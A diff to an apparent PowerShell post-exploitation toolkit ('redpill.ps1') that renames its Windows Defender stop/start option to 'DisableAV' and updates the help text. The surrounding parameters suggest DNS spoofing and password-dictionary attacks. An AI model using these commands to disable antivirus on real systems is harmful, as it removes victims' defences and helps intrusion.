@@ -88,10 +88,10 @@
    [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
+   [string]$DisableAV="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
-   [string]$Sponsor="false",
-   [string]$Action="False"
+   [string]$Sponsor="false"
 )
 
 
@@ -2092,7 +2092,7 @@ If($DnsSpoof -ne "false"){
    If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
 }
 
-If($Action -ne "false"){
+If($DisableAV -ne "false"){
 
    <#
    .SYNOPSIS
@@ -2107,26 +2107,26 @@ If($Action -ne "false"){
       Mandatory requirements: $ Administrator privileges $
       Remark: Windows warns users that WinDefend is stopped!
 
-   .Parameter Action
+   .Parameter DisableAV
       Accepts arguments: Query, Stop and Start
 
    .Parameter ServiceName
       Accepts the Windows Defender Service Name
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Query
+      PS C:\> powershell -File redpill.ps1 -DisableAV Query
       Querys the Windows Defender Service State
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Start
+      PS C:\> powershell -File redpill.ps1 -DisableAV Start
       Starts the Windows Defender Service (WinDefend)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Stop
+      PS C:\> powershell -File redpill.ps1 -DisableAV Stop
       Stops the Windows Defender Service (WinDefend)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Stop -ServiceName "WinDefend"
+      PS C:\> powershell -File redpill.ps1 -DisableAV Stop -ServiceName "WinDefend"
       Manual Input of Windows Defender Service Name (query: cmd /c sc query)
 
    .OUTPUTS
@@ -2151,7 +2151,7 @@ If($Action -ne "false"){
    }
 
    ## Run auxiliary module
-   powershell -File "$Env:TMP\DisableDefender.ps1" -Action $Action -ServiceName "$ServiceName"
+   powershell -File "$Env:TMP\DisableDefender.ps1" -Action $DisableAV -ServiceName "$ServiceName"
 
    ## Clean Artifacts left behind
    If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
@@ -3328,13 +3328,13 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
-}ElseIf($Help -ieq "Action" -or $Help -ieq "ServiceName"){
+}ElseIf($Help -ieq "DisableAV" -or $Help -ieq "ServiceName"){
 $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
       Author: @M2Team|@r00t-3xp10it
-      Disable Windows Defender Service (WinDefend) 
+      Helper - Disable Windows Defender Service (WinDefend) 
 
    .DESCRIPTION
       This CmdLet Query, Stops, Start Anti-Virus Windows Defender
@@ -3344,26 +3344,26 @@ $HelpParameters = @"
       Mandatory requirements: $ Administrator privileges $
       Remark: Windows warns users that WinDefend is stopped!
 
-   .Parameter Action
+   .Parameter DisableAV
       Accepts arguments: Query, Stop and Start
 
    .Parameter ServiceName
       Accepts the Windows Defender Service Name
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Query
+      PS C:\> powershell -File redpill.ps1 -DisableAV Query
       Querys the Windows Defender Service State
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Start
+      PS C:\> powershell -File redpill.ps1 -DisableAV Start
       Starts the Windows Defender Service (WinDefend)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Stop
+      PS C:\> powershell -File redpill.ps1 -DisableAV Stop
       Stops the Windows Defender Service (WinDefend)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Stop -ServiceName "WinDefend"
+      PS C:\> powershell -File redpill.ps1 -DisableAV Stop -ServiceName "WinDefend"
       Manual Input of Windows Defender Service Name (query: cmd /c sc query)
 
    .OUTPUTS
